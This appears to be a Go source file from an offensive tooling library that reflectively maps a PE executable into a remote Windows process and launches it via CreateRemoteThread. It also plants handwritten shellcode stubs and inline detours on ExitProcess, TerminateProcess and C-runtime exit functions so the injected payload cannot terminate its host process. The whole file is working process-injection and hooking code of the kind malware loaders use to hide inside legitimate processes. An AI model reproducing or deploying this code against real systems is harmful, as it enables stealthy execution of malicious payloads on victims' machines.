package pe

import (
    "fmt"
    "log"
    "unsafe"

    api "github.com/carved4/go-wincall"
)

// LoadPERemote maps a PE image (EXE) into a remote process and starts its entry thread.
// It mirrors the RemoteImage DLL mapping flow but targets PE entry instead of DllMain.
func LoadPERemote(pHandle uintptr, peBytes []byte) (*PEMapping, error) {
    pid, pidErr := GetProcessIdFromHandle(pHandle)
    if pidErr != nil {
        return nil, fmt.Errorf("failed to get PID from handle: %v", pidErr)
    }

    ri, err := newRemoteImage(pHandle, pid, peBytes)
    if err != nil {
        return nil, err
    }
    if err := ri.allocImage(); err != nil {
        return nil, err
    }
    if err := ri.writeHeadersAndSections(); err != nil {
        return nil, err
    }
    if err := ri.applyRelocations(); err != nil {
        return nil, err
    }
    if err := ri.resolveImports(); err != nil {
        return nil, err
    }
    if err := ri.protectMemory(); err != nil {
        return nil, err
    }

    // Run TLS callbacks (if any), then start the PE entry point as a new thread.
    ri.runEXETLSAndEntry()

    return createPEMapping(ri.base, ri.imageSize), nil
}

// runEXETLSAndEntry executes TLS callbacks (DLL_PROCESS_ATTACH semantics), then creates a thread at the PE entry.
func (ri *RemoteImage) runEXETLSAndEntry() {
    // TLS callbacks
    tlsDir := ri.nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]
    if tlsDir.VirtualAddress != 0 && tlsDir.Size >= uint32(unsafe.Sizeof(IMAGE_TLS_DIRECTORY64{})) {
        tlsOff := rvaToOffsetLocal(ri.dllPtr, ri.e_lfanew, tlsDir.VirtualAddress)
        tls := (*IMAGE_TLS_DIRECTORY64)(unsafe.Pointer(ri.dllPtr + tlsOff))
        if tls.AddressOfCallBacks != 0 {
            callbacksRVA := uint32(uintptr(tls.AddressOfCallBacks) - uintptr(ri.preferredBase))
            cbOff := rvaToOffsetLocal(ri.dllPtr, ri.e_lfanew, callbacksRVA)
            for idx := 0; ; idx++ {
                cbPref := *(*uint64)(unsafe.Pointer(ri.dllPtr + cbOff + uintptr(idx*8)))
                if cbPref == 0 {
                    break
                }
                target := ri.base + uintptr(cbPref-uint64(ri.preferredBase))
                if err := callRemoteDllMainLike(ri.pHandle, ri.base, target); err != nil {
                    log.Printf("[RemoteImage] TLS callback #%d failed: %v", idx, err)
                }
            }
        }
    }

    // Start entry thread (do not wait to avoid blocking on long-running payloads)
    if ri.nt.OptionalHeader.AddressOfEntryPoint != 0 {
        startAddr := ri.base + uintptr(ri.nt.OptionalHeader.AddressOfEntryPoint)
        var threadId uintptr
        hThread, terr := api.Call("kernel32.dll", "CreateRemoteThread", ri.pHandle, 0, 0, startAddr, 0, 0, uintptr(unsafe.Pointer(&threadId)))
        if terr != nil || hThread == 0 {
            log.Printf("[RemoteImage] CreateRemoteThread(entry) failed: %v", terr)
            return
        }
        // Close handle immediately; let remote thread run independently
        api.Call("kernel32.dll", "CloseHandle", hThread)
    }
}

// remoteExitHook mirrors the local exitHook but stores original remote bytes.
type remoteExitHook struct {
    target    uintptr
    orig      [16]byte
    size      uintptr
    installed bool
}

// installRemoteExitGuards installs detours in the remote process that redirect common exit APIs to ExitThread.
// This prevents injected payloads from terminating the entire remote process.
func installRemoteExitGuards(pHandle uintptr, pid uint32) (stub uintptr, hooks []remoteExitHook, err error) {
    // Resolve remote kernel32 base and ExitThread RVA locally
    k32Local, lerr := GetLocalModuleBase("kernel32.dll")
    if lerr != nil { return 0, nil, fmt.Errorf("GetLocalModuleBase(kernel32): %v", lerr) }
    exitThreadRVA, rerr := GetLocalProcRVA(k32Local, "ExitThread")
    if rerr != nil { return 0, nil, fmt.Errorf("GetLocalProcRVA(ExitThread): %v", rerr) }
    k32Remote, kerr := RemoteGetModuleBaseByName(pid, "KERNEL32.dll")
    if kerr != nil || k32Remote == 0 { return 0, nil, fmt.Errorf("remote kernel32 not found") }
    exitThreadRemote := k32Remote + exitThreadRVA

    // Build the remote stub: sub rsp,0x28; xor rcx,rcx; mov rax, ExitThread; call rax; add rsp,0x28; ret
    code := []byte{0x48, 0x83, 0xEC, 0x28, 0x48, 0x31, 0xC9, 0x48, 0xB8}
    code = append(code, uintptrToBytes(exitThreadRemote)...)
    code = append(code, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x28, 0xC3)
    s, aerr := api.Call("kernel32.dll", "VirtualAllocEx", pHandle, 0, uintptr(len(code)), uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(PAGE_EXECUTE_READWRITE))
    if aerr != nil || s == 0 {
        return 0, nil, fmt.Errorf("VirtualAllocEx(stub) failed: %v", aerr)
    }
    stub = s
    var wrote uintptr
    st, werr := api.NtWriteVirtualMemory(pHandle, stub, uintptr(unsafe.Pointer(&code[0])), uintptr(len(code)), &wrote)
    if werr != nil || st != 0 || wrote != uintptr(len(code)) {
        api.Call("kernel32.dll", "VirtualFreeEx", pHandle, stub, 0, uintptr(MEM_RELEASE))
        return 0, nil, fmt.Errorf("NtWriteVirtualMemory(stub) 0x%X err=%v", st, werr)
    }

    // Helper to add a hook for a given module!symbol
    addHook := func(mod, name string) {
        if mod == "" || name == "" { return }
        hb, herr := GetLocalModuleBase(mod)
        if herr != nil || hb == 0 { return }
        rva, perr := GetLocalProcRVA(hb, name)
        if perr != nil { return }
        rb, rerr := RemoteGetModuleBaseByName(pid, mod)
        if rerr != nil || rb == 0 {
            rb, rerr = LoadLibraryRemote(pHandle, pid, mod)
            if rerr != nil || rb == 0 { return }
        }
        target := rb + rva
        var hk remoteExitHook
        hk.target = target
        hk.size = 12
        // Save original bytes
        var buf [16]byte
        api.NtReadVirtualMemory(pHandle, target, uintptr(unsafe.Pointer(&buf[0])), hk.size, nil)
        hk.orig = buf
        // Make writable/executable
        bb := target
        sz := hk.size
        var oldProt uintptr
        api.NtProtectVirtualMemory(pHandle, &bb, &sz, PAGE_EXECUTE_READWRITE, &oldProt)
        // Build absolute jmp: mov rax, imm64; jmp rax
        det := []byte{0x48, 0xB8}
        det = append(det, uintptrToBytes(stub)...)
        det = append(det, 0xFF, 0xE0)
        var w uintptr
        api.NtWriteVirtualMemory(pHandle, target, uintptr(unsafe.Pointer(&det[0])), uintptr(len(det)), &w)
        // Restore prot
        api.NtProtectVirtualMemory(pHandle, &bb, &sz, oldProt, &oldProt)
        // Flush instruction cache for remote process
        api.Call("kernel32.dll", "FlushInstructionCache", pHandle, target, uintptr(len(det)))
        hk.installed = true
        hooks = append(hooks, hk)
    }

    // Hook user-mode and CRT exits; avoid ntdll termination paths.
    addHook("kernel32.dll", "ExitProcess")
    addHook("kernel32.dll", "TerminateProcess")
    addHook("kernelbase.dll", "ExitProcess")
    addHook("kernelbase.dll", "TerminateProcess")
    addHook("msvcrt.dll", "exit")
    addHook("msvcrt.dll", "_exit")
    addHook("msvcrt.dll", "_cexit")
    addHook("ucrtbase.dll", "exit")
    addHook("ucrtbase.dll", "_exit")
    addHook("ucrtbase.dll", "_cexit")
    addHook("vcruntime140.dll", "_cexit")
    addHook("vcruntime140_1.dll", "_cexit")

    return stub, hooks, nil
}

// uninstallRemoteExitGuards restores patched bytes and frees the stub.
func uninstallRemoteExitGuards(pHandle uintptr, stub uintptr, hooks []remoteExitHook) {
    for _, hk := range hooks {
        if !hk.installed || hk.target == 0 || hk.size == 0 { continue }
        bb := hk.target
        sz := hk.size
        var oldProt uintptr
        api.NtProtectVirtualMemory(pHandle, &bb, &sz, PAGE_EXECUTE_READWRITE, &oldProt)
        var w uintptr
        api.NtWriteVirtualMemory(pHandle, hk.target, uintptr(unsafe.Pointer(&hk.orig[0])), hk.size, &w)
        api.NtProtectVirtualMemory(pHandle, &bb, &sz, oldProt, &oldProt)
        api.Call("kernel32.dll", "FlushInstructionCache", pHandle, hk.target, uintptr(hk.size))
    }
    if stub != 0 {
        api.Call("kernel32.dll", "VirtualFreeEx", pHandle, stub, 0, uintptr(MEM_RELEASE))
    }
}

// RemoteMeltPE maps and starts a PE in the remote process while installing exit guards
// that keep the target process alive if the payload attempts to terminate it.
// It leaves hooks installed; caller may later call the Uninstall function on the returned guard.
type RemoteExitGuards struct {
    Stub  uintptr
    Hooks []remoteExitHook
}

func (g *RemoteExitGuards) Uninstall(pHandle uintptr) { uninstallRemoteExitGuards(pHandle, g.Stub, g.Hooks) }

func RemoteMeltPE(pHandle uintptr, peBytes []byte) (*PEMapping, *RemoteExitGuards, error) {
    pid, pidErr := GetProcessIdFromHandle(pHandle)
    if pidErr != nil {
        return nil, nil, fmt.Errorf("failed to get PID from handle: %v", pidErr)
    }

    // Install remote exit guards first
    stub, hooks, gerr := installRemoteExitGuards(pHandle, pid)
    if gerr != nil {
        // not fatal; proceed without guards
        log.Printf("[RemoteMeltPE] installRemoteExitGuards failed: %v", gerr)
    }

    ri, err := newRemoteImage(pHandle, pid, peBytes)
    if err != nil {
        if stub != 0 || len(hooks) > 0 { uninstallRemoteExitGuards(pHandle, stub, hooks) }
        return nil, nil, err
    }
    if err := ri.allocImage(); err != nil {
        if stub != 0 || len(hooks) > 0 { uninstallRemoteExitGuards(pHandle, stub, hooks) }
        return nil, nil, err
    }
    if err := ri.writeHeadersAndSections(); err != nil {
        if stub != 0 || len(hooks) > 0 { uninstallRemoteExitGuards(pHandle, stub, hooks) }
        return nil, nil, err
    }
    if err := ri.applyRelocations(); err != nil {
        if stub != 0 || len(hooks) > 0 { uninstallRemoteExitGuards(pHandle, stub, hooks) }
        return nil, nil, err
    }
    if err := ri.resolveImports(); err != nil {
        if stub != 0 || len(hooks) > 0 { uninstallRemoteExitGuards(pHandle, stub, hooks) }
        return nil, nil, err
    }
    if err := ri.protectMemory(); err != nil {
        if stub != 0 || len(hooks) > 0 { uninstallRemoteExitGuards(pHandle, stub, hooks) }
        return nil, nil, err
    }

    // Run TLS and start entry thread
    ri.runEXETLSAndEntry()

    return createPEMapping(ri.base, ri.imageSize), &RemoteExitGuards{Stub: stub, Hooks: hooks}, nil
}

